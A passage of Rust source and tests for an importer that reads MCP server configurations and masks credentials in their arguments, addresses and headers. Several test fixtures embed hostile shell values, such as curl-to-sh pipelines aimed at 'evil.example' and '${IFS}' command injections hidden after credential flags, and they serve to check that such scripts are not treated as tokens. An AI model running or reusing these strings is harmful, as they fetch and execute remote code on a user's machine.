    let mut after_flag = false;
    let mut before = "";
    for arg in args {
        // The value after a credential's flag is its value even when it
        // begins with `-` (`--api-key -x7Kq…`; since the step 25 fixes'
        // review: it was drawn whole and imported).
        let shown = if after_flag && Masked::of(arg) != Masked::No {
            hidden = hidden.and(Masked::of(arg).under(before, arg, cmd));
            mask.to_owned()
        } else if let Some((name, value)) = arg.split_once('=')
                // An address's first `=` is in its query or fragment, whose
                // fields are masked below, not before a name.
                && !name.contains("://")
                && names_a_secret(name, false)
                && Masked::of(value) != Masked::No
        {
            hidden = hidden.and(Masked::of(value).under(name, value, cmd));
            format!("{name}={mask}")
        } else if let Some((name, value)) = header_argument(arg) {
            // A header given as an argument (`--header "X-API-Key: …"`,
            // mcp-remote's `Authorization: Bearer …`), whole or as a
            // `NAME=`'s value: masked by the header's name, a scheme
            // (`Bearer`) kept in view (since the step 25 fixes' review).
            let (scheme, credential) = auth_scheme(value);
            hidden = hidden.and(Masked::of(credential).under(name, credential, cmd));
            let at = arg.len() - value.len();
            format!("{}{scheme}{mask}", &arg[..at])
        } else if arg.contains("://") {
            // An address (`--auth-url https://…`): its host and path shown,
            // and a credential in its query masked, as in a server's own
            // address; its user part was masked as it was read.
            let (shown, masked) = masked_query(arg, false, cmd, 0);
            hidden = hidden.and(masked);
            shown
        } else {
            arg.clone()
        };
        after_flag = arg.starts_with('-') && !arg.contains('=') && names_a_secret(arg, false);
        before = arg;
        parts.push(shown);
    }
    (parts, hidden)
}

/// `arg` read as a header given as an argument, `Name: value`, the whole
/// argument or a `NAME=`'s value (`--header=X-API-Key: …`), whose name is
/// a header's (ASCII letters, digits, `-` and `_`) and says it is a
/// credential's by the rules above, with a value to hide: the header's
/// name, and its value as a part of `arg` (since the step 25 fixes'
/// review: `--header "X-API-Key: x7Kq…"` and mcp-remote's
/// `--header "Authorization: Bearer …"` were drawn whole and imported).
fn header_argument(arg: &str) -> Option<(&str, &str)> {
    fn read(text: &str) -> Option<(&str, &str)> {
        let (name, value) = text.split_once(':')?;
        let value = value.trim_start();
        let header = !name.is_empty()
            && name.chars().all(|character| {
                character.is_ascii_alphanumeric() || matches!(character, '-' | '_')
            });
        (header && names_a_secret(name, false) && Masked::of(auth_scheme(value).1) != Masked::No)
            .then_some((name, value))
    }
    read(arg).or_else(|| read(arg.split_once('=')?.1))
}

/// The schemes an `Authorization` header's value begins with, shown before
/// the credential they name: `Bearer [redacted]`.
const AUTH_SCHEMES: &[&str] = &["bearer", "basic", "token", "bot", "digest"];

/// `value` split into its scheme with the space after it (`Bearer `), when
/// it begins with one of [`AUTH_SCHEMES`] in any case and something
/// follows, and the credential: `("", value)` otherwise.
fn auth_scheme(value: &str) -> (&str, &str) {
    if let Some((scheme, rest)) = value.split_once(' ')
        && AUTH_SCHEMES
            .iter()
            .any(|known| scheme.eq_ignore_ascii_case(known))
    {
        let credential = rest.trim_start();
        if !credential.is_empty() {
            return (&value[..value.len() - credential.len()], credential);
        }
    }
    ("", value)
}

/// `part` with every credential the formats know masked, and an address's
/// user part (`scheme://user:password@`); and, for an `argument`, the user
/// part of an address with no scheme too ([`without_bare_users`]). What
/// the import refuses a server for ([`Refusal::HoldsCredential`]), and what
/// every view of the configuration masks first.
fn formats_masked(filter: &SecretFilter, part: &str, argument: bool) -> String {
    let shown = filter.redact(part);
    let shown =
        crate::schema::redact::without_url_users(&shown).unwrap_or_else(|| shown.into_owned());
    if argument {
        without_bare_users(&shown).unwrap_or(shown)
    } else {
        shown
    }
}

/// An MCP server's arguments as every view of the configuration shows them
/// (`cineris config show`, every `--layer`, `Loaded::effective` and
/// `value`, the `Debug` forms, so `config/get` and the interface's
/// `/config`): by the import's own rule, so that what the first run drew
/// `[redacted]` is `[redacted]` everywhere (since the step 25 fixes, the
/// review; the owner's choice): what the formats know, an address's user
/// part with or without its scheme, and a value whose name says it is a
/// credential, each masked; one argument for each, in place.
#[must_use]
pub(crate) fn shown_args(args: &[String]) -> Vec<String> {
    let filter = SecretFilter::new();
    let masked: Vec<String> = args
        .iter()
        .map(|arg| formats_masked(&filter, arg, true))
        .collect();
    args_view(&masked, false).0
}

/// An MCP server's address as every view of the configuration shows it
/// ([`shown_args`]): what the formats know and its user part masked, and a
/// field of its query or fragment named as a credential's.
#[must_use]
pub(crate) fn shown_address(url: &str) -> String {
    let masked = formats_masked(&SecretFilter::new(), url, false);
    masked_query(&masked, true, false, 0).0
}

/// An MCP server's program as every view of the configuration shows it:
/// what the formats know masked, as the import masks it.
#[must_use]
pub(crate) fn shown_program(program: &str) -> String {
    formats_masked(&SecretFilter::new(), program, false)
}

/// The schemes of an address that have no `//`, whose text before an `@`
/// is no user part: `mailto:me@example.com`, `npm:pkg@1.2.3`.
const NO_USER_SCHEMES: &[&str] = &[
    "mailto", "sip", "sips", "xmpp", "im", "pres", "urn", "tel", "npm", "jsr",
];

/// `arg` with the user part of an address that has no scheme masked:
/// `me:password@proxy.example.com:8080`, the whole argument or the value
/// of its `NAME=` (`--proxy=me:password@…`), shows as
/// `[redacted]@proxy.example.com:8080` (since the step 25 fixes, the
/// review). `None` when it holds none.
///
/// **It is the import's, and not the secret filter's,** whose formats run
/// over every line of a session's log and are kept narrow on purpose
/// (`cineris_base::redact`): text of the form `a:b@c` is not only an
/// address there. Here the text is a program's argument, and the shape is
/// read strictly: a user and a password of no white space and no `/`, `?`,
/// `#` or `@` in the user, a scheme with no `//` before it not among
/// [`NO_USER_SCHEMES`], and after the `@` a host (`localhost`, an IPv4
/// address, one in `[…]`, or a name of two labels or more whose last is
/// letters alone) with a port of digits and a path, or a Go driver's
/// `tcp(…)`, `tcp6(…)` or `unix(…)`. So `git@github.com:org/repo`,
/// `me@example.com`, `a:b` in a sentence, `alpine:3.19@sha256:…` and
/// `npm:pkg@1.2.3` are left as they are.
pub(crate) fn without_bare_users(arg: &str) -> Option<String> {
    if let Some(masked) = bare_user_masked(arg) {
        return Some(masked);
    }
    let (name, value) = arg.split_once('=')?;
    bare_user_masked(value).map(|masked| format!("{name}={masked}"))
}

/// `text`, an address with no scheme whose user part holds a password,
/// with its user part masked ([`without_bare_users`]).
fn bare_user_masked(text: &str) -> Option<String> {
    let mask = cineris_base::redact::MASK;
    // A password may hold an `@` written as it is: the last one ends the
    // user part, so that all of it is masked.
    let (userinfo, place) = text.rsplit_once('@')?;
    let (user, password) = userinfo.split_once(':')?;
    let user_character = |character: char| {
        character.is_ascii_alphanumeric()
            || matches!(
                character,
                '-' | '.'
                    | '_'
                    | '~'
                    | '%'
                    | '!'
                    | '$'
                    | '&'
                    | '\''
                    | '('
                    | ')'
                    | '*'
                    | '+'
                    | ','
                    | ';'
            )
    };
    let password_character = |character: char| {
        !character.is_whitespace()
            && !character.is_control()
            && !matches!(character, '/' | '?' | '#')
    };
    if user.is_empty()
        || password.is_empty()
        || password == mask
        || !user.chars().all(user_character)
        || !password.chars().all(password_character)
        || NO_USER_SCHEMES
            .iter()
            .any(|scheme| user.eq_ignore_ascii_case(scheme))
        || !bare_place(place)
    {
        return None;
    }
    Some(format!("{mask}@{place}"))
}

/// Whether `place`, the text after an address's `@`, is a host, a port and
/// a path ([`without_bare_users`]).
fn bare_place(place: &str) -> bool {
    if place
        .chars()
        .any(|character| character.is_whitespace() || character.is_control())
    {
        return false;
    }
    for driver in ["tcp(", "tcp6(", "unix("] {
        if let Some(rest) = place.strip_prefix(driver) {
            return rest.contains(')');
        }
    }
    let end = place.find(['/', '?', '#']).unwrap_or(place.len());
    let authority = &place[..end];
    let (host, port) = if authority.starts_with('[') {
        match authority.find(']') {
            Some(close) => (&authority[..=close], &authority[close + 1..]),
            None => return false,
        }
    } else {
        match authority.rsplit_once(':') {
            Some((host, _)) => (host, &authority[host.len()..]),
            None => (authority, ""),
        }
    };
    let port_ok = port.is_empty()
        || port.strip_prefix(':').is_some_and(|digits| {
            (1..=5).contains(&digits.len()) && digits.chars().all(|c| c.is_ascii_digit())
        });
    port_ok && bare_host(host)
}

/// Whether `host` is a host's name: `localhost`, an IPv4 address, an
/// address in `[…]`, or two labels or more of letters, digits and `-`
/// whose last is letters alone (a top-level domain's).
fn bare_host(host: &str) -> bool {
    if host.starts_with('[') {
        return host.len() > 2 && host.ends_with(']');
    }
    if host.eq_ignore_ascii_case("localhost") {
        return true;
    }
    let labels: Vec<&str> = host.split('.').collect();
    if labels.len() == 4
        && labels
            .iter()
            .all(|label| label.parse::<u8>().is_ok() && !label.is_empty())
    {
        return true;
    }
    labels.len() >= 2
        && labels.iter().all(|label| {
            !label.is_empty()
                && label
                    .chars()
                    .all(|character| character.is_ascii_alphanumeric() || character == '-')
        })
        && labels.last().is_some_and(|last| {
            last.len() >= 2
                && last
                    .chars()
                    .all(|character| character.is_ascii_alphabetic())
        })
}

/// Why a file could not be read.
#[derive(Debug, Clone, PartialEq, Eq, thiserror::Error)]
pub enum ImportError {
    /// It could not be opened or read.
    #[error("it could not be read: {0}")]
    Unreadable(String),
    /// It is larger than [`MAX_FILE`].
    #[error("it is larger than {} MiB", MAX_FILE / 1024 / 1024)]
    TooLarge,
    /// It is not the JSON or TOML its tool writes.
    #[error("it is not the file this version knows: {0}")]
    NotUnderstood(String),
}

/// The servers of another client's file at `path`, read whole, values
/// dropped and masked as the [module documentation](self) says. Only the
/// file is read: no value of it is asked of the disk. A file ending in
/// `.toml` is Codex's, and any other JSON.
///
/// # Errors
///
/// [`ImportError`] when it cannot be read or is not understood.
pub fn read_servers(path: &Path) -> Result<Vec<ImportedServer>, ImportError> {
    read_servers_within(path, MAX_FILE)
}

/// [`read_servers`] with `limit` in [`MAX_FILE`]'s place, for its test.
#[allow(
    clippy::disallowed_types,
    reason = "opens the one file the person asked to see inside, on the setup's worker; the only \
              call of the file system in this module, so that clippy refuses any other, such as \
              a question about a value (the short read of B, L5)"
)]
fn read_servers_within(path: &Path, limit: u64) -> Result<Vec<ImportedServer>, ImportError> {
    let file =
        std::fs::File::open(path).map_err(|error| ImportError::Unreadable(error.to_string()))?;
    let mut text = String::new();
    file.take(limit + 1)
        .read_to_string(&mut text)
        .map_err(|error| ImportError::Unreadable(error.to_string()))?;
    if text.len() as u64 > limit {
        return Err(ImportError::TooLarge);
    }
    let toml = path
        .extension()
        .is_some_and(|extension| extension.eq_ignore_ascii_case("toml"));
    servers_in(&text, toml)
}

/// The servers of a file's `text`: TOML (`[mcp_servers.<name>]`) or JSON
/// (`mcpServers`).
///
/// # Errors
///
/// [`ImportError::NotUnderstood`] when it is neither.
pub fn servers_in(text: &str, toml: bool) -> Result<Vec<ImportedServer>, ImportError> {
    let text = text.strip_prefix('\u{feff}').unwrap_or(text);
    let value: serde_json::Value = if toml {
        let table: toml::Table = text.parse().map_err(|error: toml::de::Error| {
            ImportError::NotUnderstood(error.message().to_owned())
        })?;
        let table = table
            .get("mcp_servers")
            .cloned()
            .unwrap_or(toml::Value::Table(toml::Table::new()));
        serde_json::to_value(table)
            .map_err(|error| ImportError::NotUnderstood(error.to_string()))?
    } else {
        let value: serde_json::Value = serde_json::from_str(text)
            .map_err(|error| ImportError::NotUnderstood(format!("line {}", error.line())))?;
        value
            .get("mcpServers")
            .cloned()
            .unwrap_or(serde_json::Value::Object(serde_json::Map::new()))
    };
    let serde_json::Value::Object(servers) = value else {
        return Err(ImportError::NotUnderstood(
            "its servers are not a table of names".to_owned(),
        ));
    };
    let filter = SecretFilter::new();
    let mut servers: Vec<ImportedServer> = servers
        .iter()
        .take(MAX_SERVERS)
        .map(|(name, entry)| server(&filter, name, entry))
        .collect();
    // Each header a variable of its own among the file's servers, and none
    // of the harness's; the first run names them again among every file it
    // read, with the providers' keys the configuration knows.
    HeaderVariables::default().name(&mut servers);
    Ok(servers)
}

fn server(filter: &SecretFilter, name: &str, entry: &serde_json::Value) -> ImportedServer {
    let text = |key: &str| entry.get(key).and_then(serde_json::Value::as_str);
    let names = |key: &str| -> Vec<String> {
        entry
            .get(key)
            .and_then(serde_json::Value::as_object)
            .map(|table| table.keys().cloned().collect())
            .unwrap_or_default()
    };
    let mut masked = false;
    let mut mask = |part: &str, argument: bool| -> String {
        let shown = formats_masked(filter, part, argument);
        masked |= shown != part;
        shown
    };
    // An argument that is not text (an object, a list, a number), or
    // arguments that are not a list, is not a command line this version
    // reads: the server is refused, and the argument shown masked whole,
    // never as its JSON (since the step 25 fixes, the review: `{"token":
    // "…"}` was drawn and imported as its text).
    let mut not_text = false;
    let launch = match (text("command"), text("url")) {
        (Some(program), _) => {
            let args = match entry.get("args") {
                None | Some(serde_json::Value::Null) => Vec::new(),
                Some(serde_json::Value::Array(args)) => args
                    .iter()
                    .map(|arg| match arg {
                        serde_json::Value::String(arg) => mask(arg, true),
                        _ => {
                            not_text = true;
                            cineris_base::redact::MASK.to_owned()
                        }
                    })
                    .collect(),
                Some(_) => {
                    not_text = true;
                    vec![cineris_base::redact::MASK.to_owned()]
                }
            };
            Some(Launch::Command {
                program: mask(program, false),
                args,
            })
        }
        (None, Some(url)) => Some(Launch::Remote {
            url: mask(url, false),
        }),
        (None, None) => None,
    };
    let env = names("env");
    let headers: Vec<Header> = names("headers")
        .into_iter()
        .map(|header| Header {
            variable: derived_variable(name, &header),
            name: header,
        })
        .collect();
    let Some(launch) = launch else {
        return ImportedServer {
            name: name.to_owned(),
            launch: Launch::Command {
                program: String::new(),
                args: Vec::new(),
            },
            env,
            headers,
            refused: Some(Refusal::NotUnderstood),
        };
    };
    let mut server = ImportedServer {
        name: name.to_owned(),
        launch,
        env,
        headers,
        refused: None,
    };
    let unseen = |text: &str| text.chars().any(cineris_base::acts_unseen);
    let names_unseen = server
        .env
        .iter()
        .chain(server.headers.iter().map(|header| &header.name))
        .any(|name| unseen(name) || name.is_empty());
    let launch_unseen = match &server.launch {
        Launch::Command { program, args } => unseen(program) || args.iter().any(|arg| unseen(arg)),
        Launch::Remote { url } => unseen(url),
    };
    server.refused = if unseen(&server.name) || launch_unseen || names_unseen {
        Some(Refusal::Unseen)
    } else if !settable_name(&server.name) {
        Some(Refusal::Name)
    } else if not_text || !givable(&server) {
        Some(Refusal::NotUnderstood)
    } else if masked {
        Some(Refusal::HoldsCredential)
    } else if launch_view(&server.launch).1 == Masked::Loose {
        Some(Refusal::NamedValue)
    } else {
        None
    };
    server
}

#[cfg(test)]
#[allow(
    clippy::disallowed_methods,
    clippy::disallowed_types,
    reason = "the tests write files of their own, and ask whether paths of their own exist"
)]
mod tests {
    use cineris_base::redact::MASK;

    use super::*;

    const CLAUDE: &str = r#"{
      "numStartups": 4,
      "mcpServers": {
        "docs": {"type": "stdio", "command": "npx", "args": ["-y", "@example/docs-mcp", "--root", "~/src/docs"],
                 "env": {"DOCS_TOKEN": "dt_live_0123456789abcdef"}},
        "tracker": {"type": "http", "url": "https://tracker.example.com/mcp",
                    "headers": {"Authorization": "Bearer tk_9f8e7d6c5b4a39281706"}},
        "github": {"command": "docker", "args": ["run", "-i", "--rm", "-e",
                   "GITHUB_TOKEN=ghp_abcdefghijklmnopqrstuvwxyz0123456789", "ghcr.io/example/github-mcp:1.4"]},
        "proxy": {"url": "https://user:hunter2hunter2@proxy.example.com/mcp"},
        "odd\u202e": {"command": "x"},
        "nothing": {"type": "stdio"}
      },
      "projects": {"/work/x": {"mcpServers": {"inner": {"command": "y"}}}}
    }"#;

    fn by_name<'a>(servers: &'a [ImportedServer], name: &str) -> &'a ImportedServer {
        servers.iter().find(|server| server.name == name).unwrap()
    }

    #[test]
    fn values_are_dropped_and_names_kept() {
        let servers = servers_in(CLAUDE, false).unwrap();
        assert_eq!(servers.len(), 6, "the user's servers, not a project's");
        let docs = by_name(&servers, "docs");
        assert_eq!(docs.shown(), "npx -y @example/docs-mcp --root ~/src/docs");
        assert_eq!(docs.env, ["DOCS_TOKEN"]);
        assert_eq!(docs.refused, None);
        let tracker = by_name(&servers, "tracker");
        assert_eq!(tracker.shown(), "https://tracker.example.com/mcp");
        assert_eq!(
            tracker.headers,
            [Header {
                name: "Authorization".to_owned(),
                variable: "TRACKER_AUTHORIZATION".to_owned(),
            }]
        );
        assert_eq!(tracker.host().as_deref(), Some("tracker.example.com"));
        assert_eq!(docs.host(), None);
        assert_eq!(tracker.refused, None);
        let debug = format!("{servers:?}");
        for value in ["dt_live", "tk_9f8e", "ghp_abc", "hunter2"] {
            assert!(!debug.contains(value), "{value} left the reader: {debug}");
        }
    }

    #[test]
    fn a_credential_in_a_command_or_an_address_is_masked_and_refused() {
        let servers = servers_in(CLAUDE, false).unwrap();
        let github = by_name(&servers, "github");
        assert_eq!(
            github.shown(),
            format!("docker run -i --rm -e GITHUB_TOKEN={MASK} ghcr.io/example/github-mcp:1.4")
        );
        assert_eq!(github.refused, Some(Refusal::HoldsCredential));
        let proxy = by_name(&servers, "proxy");
        assert_eq!(
            proxy.shown(),
            format!("https://{MASK}@proxy.example.com/mcp")
        );
        assert_eq!(proxy.refused, Some(Refusal::HoldsCredential));
        assert_eq!(
            by_name(&servers, "odd\u{202e}").refused,
            Some(Refusal::Unseen)
        );
        assert_eq!(
            by_name(&servers, "nothing").refused,
            Some(Refusal::NotUnderstood)
        );
    }

    #[test]
    fn codex_s_toml_and_files_that_are_not_understood() {
        let servers = servers_in(
            "model = \"x\"\n[mcp_servers.search]\ncommand = \"search-mcp\"\nargs = [\"--fast\"]\nenv = { KEY = \"v_0123456789abcdefghij\" }\n",
            true,
        )
        .unwrap();
        assert_eq!(servers.len(), 1);
        assert_eq!(servers[0].shown(), "search-mcp --fast");
        assert_eq!(servers[0].env, ["KEY"]);
        assert!(servers_in("{", false).is_err());
        assert!(servers_in("[[", true).is_err());
        assert!(servers_in("{\"mcpServers\": [1]}", false).is_err());
        assert_eq!(servers_in("{}", false).unwrap(), Vec::new());
    }

    /// A value whose name says it is a credential is shown masked (in
    /// `NAME=value`, after such a flag, in an address's query) and the
    /// server is still imported, as it is in its file, which `hidden` says;
    /// the value after such a flag is its value even when it begins with
    /// `-` (since the step 25 fixes' review; before it, the full review of
    /// the third pull request had a flag after one mask nothing, and
    /// `--api-key -x7Kq…` was drawn whole).
    #[test]
    fn a_value_named_as_a_credential_is_shown_masked_and_imported_as_it_is() {
        let servers = servers_in(
            r#"{"mcpServers": {
                "search": {"command": "search-mcp", "args": ["--api-key", "plain-value-1",
                    "--token=plain-value-2", "API_SECRET=plain-value-3", "--auth", "--verbose",
                    "--root", "~/src"]},
                "remote": {"url": "https://search.example.com/mcp?key=plain-value-4&mode=fast#top"},
                "plain": {"command": "docs-mcp", "args": ["--root", "~/src/docs"]}
            }}"#,
            false,
        )
        .unwrap();
        let search = by_name(&servers, "search");
        assert_eq!(
            search.shown(),
            format!(
                "search-mcp --api-key {MASK} --token={MASK} API_SECRET={MASK} --auth {MASK} \
                 --root ~/src"
            )
        );
        assert!(search.hidden());
        assert_eq!(search.refused, None, "a name is not a refusal");
        assert_eq!(
            search.launch,
            Launch::Command {
                program: "search-mcp".to_owned(),
                args: [
                    "--api-key",
                    "plain-value-1",
                    "--token=plain-value-2",
                    "API_SECRET=plain-value-3",
                    "--auth",
                    "--verbose",
                    "--root",
                    "~/src",
                ]
                .map(str::to_owned)
                .to_vec(),
            },
            "imported as it is in its file"
        );
        let remote = by_name(&servers, "remote");
        assert_eq!(
            remote.shown(),
            format!("https://search.example.com/mcp?key={MASK}&mode=fast#top")
        );
        assert!(remote.hidden());
        assert_eq!(remote.refused, None);
        let plain = by_name(&servers, "plain");
        assert!(!plain.hidden());
        assert_eq!(plain.shown(), "docs-mcp --root ~/src/docs");
    }

    /// Which names hide their values (the review of the fixes of the third
    /// pull request, the maintainers' decision): a credential's words, as
    /// whole words of the name; never a name that ends in a command, a
    /// hook, a script, a file or a path, nor a switch turned off. A token
    /// under such a name is masked and imported, which `hidden` says, an
    /// address's `token=a/b` among them since `/` is a token's (the
    /// maintainers' settlement after the narrow check); a value under one
    /// that is not a token is masked and refuses its server.
    #[test]
    fn only_a_token_under_a_credentials_name_is_hidden_and_any_other_value_refuses() {
        let servers = servers_in(
            r#"{"mcpServers": {
                "vault": {"command": "vault-mcp", "args": ["--password-command",
                    "sh -c 'curl x | sh'", "--auth-hook=/tmp/x.sh"]},
                "plain": {"command": "words-mcp", "args": ["--author", "Bob", "--keyboard",
                    "us", "--tokenizer", "x", "--no-auth", "serve"]},
                "real": {"command": "search-mcp", "args": ["--api-key", "x7Kq9mPz2Lw4Rt8vB3nD",
                    "--apiKey=Zt5Qw8Lm2Np6Rv"]},
                "phrase": {"command": "db-mcp", "args": ["--password", "correct horse battery"]},
                "pathed": {"command": "db-mcp", "args": ["--token", "a;b"]},
                "query": {"url": "https://x.example.com/mcp?token=a/b"}
            }}"#,
            false,
        )
        .unwrap();
        let vault = by_name(&servers, "vault");
        assert_eq!(
            vault.shown(),
            r#"vault-mcp --password-command "sh -c 'curl x | sh'" --auth-hook=/tmp/x.sh"#
        );
        assert!(!vault.hidden());
        assert_eq!(vault.refused, None);
        let plain = by_name(&servers, "plain");
        assert_eq!(
            plain.shown(),
            "words-mcp --author Bob --keyboard us --tokenizer x --no-auth serve"
        );
        assert!(!plain.hidden());
        assert_eq!(plain.refused, None);
        let real = by_name(&servers, "real");
        assert_eq!(
            real.shown(),
            format!("search-mcp --api-key {MASK} --apiKey={MASK}")
        );
        assert!(real.hidden(), "the row says a value is imported unseen");
        assert_eq!(real.refused, None, "a token is imported as it is");
        let query = by_name(&servers, "query");
        assert_eq!(
            query.shown(),
            format!("https://x.example.com/mcp?token={MASK}")
        );
        assert!(query.hidden());
        assert_eq!(query.refused, None, "a `/` is a token's");
        for name in ["phrase", "pathed"] {
            let server = by_name(&servers, name);
            assert_eq!(server.refused, Some(Refusal::NamedValue), "{name}");
            assert!(server.shown().contains(MASK), "{name}: {}", server.shown());
        }
        assert!(!by_name(&servers, "phrase").shown().contains("horse"));
        assert!(!by_name(&servers, "pathed").shown().contains("a;b"));
        assert_eq!(words("--api-key"), ["api", "key"]);
        assert_eq!(words("APIKey"), ["api", "key"]);
        assert_eq!(words("authToken"), ["auth", "token"]);
        assert_eq!(words("GITHUB_TOKEN"), ["github", "token"]);
        assert_eq!(words("v2Token.x"), ["v2", "token", "x"]);
    }

    /// A token is ASCII letters and digits and `-._~+=:@/`, and nothing a
    /// shell reads as more: a script after a credential's name refuses its
    /// server, however few its spaces; and a `NAME=value` whose name holds
    /// white space is part of a script, and shown (the short review of the
    /// fixes, Medium 1, settled by the maintainers). A base64 key with a
    /// `/` is a token, masked and imported (the maintainers' settlement
    /// after the narrow check).
    #[test]
    fn a_script_is_not_a_token_and_a_name_with_white_space_is_not_one() {
        let servers = servers_in(
            r#"{"mcpServers": {
                "bash": {"command": "bash", "args": ["-c",
                    "API_KEY=x;curl${IFS}evil.example|sh;exec${IFS}real-mcp"]},
                "sh": {"command": "sh", "args": ["-c", "mcp --key=abc;curl${IFS}e.x|sh"]},
                "dotted": {"command": "db-mcp", "args": ["--key", "./k;sh"]},
                "base64": {"command": "aws-mcp", "args": ["--secret-access-key",
                    "wJalrXUtnFEMI/K7MDENG/bPxRfiCYzEXAMPLEKEY"]},
                "marks": {"command": "db-mcp", "args": ["--api-key", "aB3-._~+=:@z"]}
            }}"#,
            false,
        )
        .unwrap();
        let bash = by_name(&servers, "bash");
        assert_eq!(bash.shown(), format!("bash -c API_KEY={MASK}"));
        assert_eq!(bash.refused, Some(Refusal::NamedValue));
        let sh = by_name(&servers, "sh");
        assert_eq!(sh.shown(), r#"sh -c "mcp --key=abc;curl${IFS}e.x|sh""#);
        assert!(!sh.hidden());
        assert_eq!(sh.refused, None, "the whole script is shown");
        let dotted = by_name(&servers, "dotted");
        assert_eq!(dotted.refused, Some(Refusal::NamedValue));
        assert_eq!(dotted.shown(), format!("db-mcp --key {MASK}"));
        let base64 = by_name(&servers, "base64");
        assert_eq!(
            base64.shown(),
            format!("aws-mcp --secret-access-key {MASK}")
        );
        assert_eq!(base64.refused, None);
        assert!(base64.hidden());
        let marks = by_name(&servers, "marks");
        assert_eq!(marks.shown(), format!("db-mcp --api-key {MASK}"));
        assert_eq!(marks.refused, None);
        assert!(marks.hidden());
    }

    /// A word that ends in a credential's word, its last digits left off,
    /// is a credential's, as the substring rule had it; `PWD` is the shell's
    /// working directory, not a password (the short review of the fixes,
    /// Medium 2, settled by the maintainers).
    #[test]
    fn a_compound_credential_name_hides_its_value_and_pwd_does_not() {
        for name in [
            "PGPASSWORD",
            "NGROK_AUTHTOKEN",
            "--authtoken",
            "--apitoken",
            "--accesstoken",
            "CLIENTSECRET",
            "PRIVATEKEY",
            "API_KEY2",
            "TOKEN1",
            "--hotkey",
            "MYSQL_PWD",
            "MYSQL_PWD2",
            "--pwd",
        ] {
            assert!(names_a_secret(name, false), "{name}");
        }
        for name in [
            "--author",
            "--keyboard",
            "--tokenizer",
            "PWD",
            "PWD2",
            "--no-auth",
        ] {
            assert!(!names_a_secret(name, false), "{name}");
        }
        let servers = servers_in(
            r#"{"mcpServers": {
                "pg": {"command": "env", "args": ["PGPASSWORD=s3cretValue", "PWD=/app",
                    "NGROK_AUTHTOKEN=2abcDEF", "KEY2=v4lue", "pg-mcp"]}
            }}"#,
            false,
        )
        .unwrap();
        assert_eq!(
            servers[0].shown(),
            format!("env PGPASSWORD={MASK} PWD=/app NGROK_AUTHTOKEN={MASK} KEY2={MASK} pg-mcp")
        );
        assert_eq!(servers[0].refused, None);
    }

    /// A name that ends in `url` or `dir` names a place, and its value is
    /// shown (settled by the maintainers, after the review of the fixes):
    /// an address's host and path show, and its user part and a credential
    /// in its query are masked; a user part still refuses its server, by
    /// 08's rule.
    #[test]
    fn a_place_named_by_url_or_dir_is_shown_with_its_credentials_masked() {
        let token = "x7Kq9mPz2Lw4Rt8vB3nD";
        let servers = servers_in(
            &format!(
                r#"{{"mcpServers": {{
                    "login": {{"command": "auth-mcp", "args": ["--auth-url",
                        "https://u:p@auth.example.com/login?api_key={token}"]}},
                    "open": {{"command": "auth-mcp", "args": [
                        "--auth-url=https://auth.example.com/login?api_key={token}&mode=fast",
                        "--secrets-dir", "/run/secrets"]}},
                    "places": {{"command": "tls-mcp", "args": ["--token-uri", "https://t.example.com/a",
                        "--token-endpoint", "https://t.example.com/b", "--secrets-directory", "/run/s x",
                        "--key", "./client.key", "--cert-key", "../k", "--win-key", ".\\k",
                        "--up-key", "..\\k", "--secrets-dir", "secrets"]}},
                    "fragment": {{"command": "auth-mcp", "args": [
                        "--auth-url", "https://h.example.com/cb#access_token={token}&state=xyz",
                        "--callback-url", "https://h.example.com/a?x=1;api_key={token}"]}}
                }}}}"#
            ),
            false,
        )
        .unwrap();
        let login = by_name(&servers, "login");
        assert_eq!(
            login.shown(),
            format!("auth-mcp --auth-url https://{MASK}@auth.example.com/login?api_key={MASK}")
        );
        assert_eq!(login.refused, Some(Refusal::HoldsCredential));
        let open = by_name(&servers, "open");
        assert_eq!(
            open.shown(),
            format!(
                "auth-mcp --auth-url=https://auth.example.com/login?api_key={MASK}&mode=fast \
                 --secrets-dir /run/secrets"
            )
        );
        assert!(open.hidden(), "the row says a value is imported unseen");
        assert_eq!(open.refused, None, "a place is not a credential");
        // `uri`, `endpoint` and `directory` name places too, a relative path
        // under a key's name is a place (the short review of the fixes,
        // settled by the maintainers), and a token under a `dir` name is
        // shown (the final review).
        let places = by_name(&servers, "places");
        assert_eq!(
            places.shown(),
            "tls-mcp --token-uri https://t.example.com/a --token-endpoint https://t.example.com/b \
             --secrets-directory \"/run/s x\" --key ./client.key --cert-key ../k --win-key .\\k \
             --up-key ..\\k --secrets-dir secrets"
        );
        assert!(!places.hidden());
        assert_eq!(places.refused, None);
        // A credential in an address's fragment, and in a field after a `;`,
        // is masked as one in its query (the final review).
        let fragment = by_name(&servers, "fragment");
        assert_eq!(
            fragment.shown(),
            format!(
                "auth-mcp --auth-url https://h.example.com/cb#access_token={MASK}&state=xyz \
                 --callback-url https://h.example.com/a?x=1;api_key={MASK}"
            )
        );
        assert!(fragment.hidden());
        assert_eq!(fragment.refused, None);
        for server in &servers {
            assert!(!server.shown().contains(token), "{}", server.shown());
        }
    }

    /// Under a credential's name `/` is a token's, in an argument and in an
    /// address's field alike: a base64 secret with a `/`, a rooted path and
    /// a `~/` path are masked and imported, the row saying a value is
    /// imported unseen, never drawn and never refused; a shell's character
    /// and a `\` refuse, the row saying to move the value into a variable;
    /// a relative path is shown, by its text alone (the maintainers'
    /// settlement after the narrow check, in place of the existence rule).
    #[test]
    fn a_slash_is_a_tokens_and_a_rooted_path_is_masked_and_imported() {
        let servers = servers_in(
            r#"{"mcpServers": {
                "aws": {"command": "aws-mcp", "args": ["--secret-access-key", "/K7MDENG/bPxRfiCYzEXAMPLEKEY"]},
                "tls": {"command": "tls-mcp", "args": ["--key", "/etc/ssl/client.key",
                    "--ssh-key", "~/.ssh/id_ed25519", "--key=/etc/ssl/k2", "TLS_KEY=/etc/ssl/k3"]},
                "script": {"command": "tls-mcp", "args": ["--key", "/x;sh"]},
                "windows": {"command": "tls-mcp", "args": ["--key", "C:\\certs\\k.pem"]},
                "relative": {"command": "tls-mcp", "args": ["--key", "./client.key"]},
                "query": {"url": "https://x.example.com/mcp?token=a/b"}
            }}"#,
            false,
        )
        .unwrap();
        let aws = by_name(&servers, "aws");
        assert_eq!(aws.shown(), format!("aws-mcp --secret-access-key {MASK}"));
        let tls = by_name(&servers, "tls");
        assert_eq!(
            tls.shown(),
            format!("tls-mcp --key {MASK} --ssh-key {MASK} --key={MASK} TLS_KEY={MASK}")
        );
        let query = by_name(&servers, "query");
        assert_eq!(
            query.shown(),
            format!("https://x.example.com/mcp?token={MASK}")
        );
        for server in [aws, tls, query] {
            assert_eq!(server.refused, None, "{}: imported as it is", server.name);
            assert!(server.hidden(), "{}: the row says so", server.name);
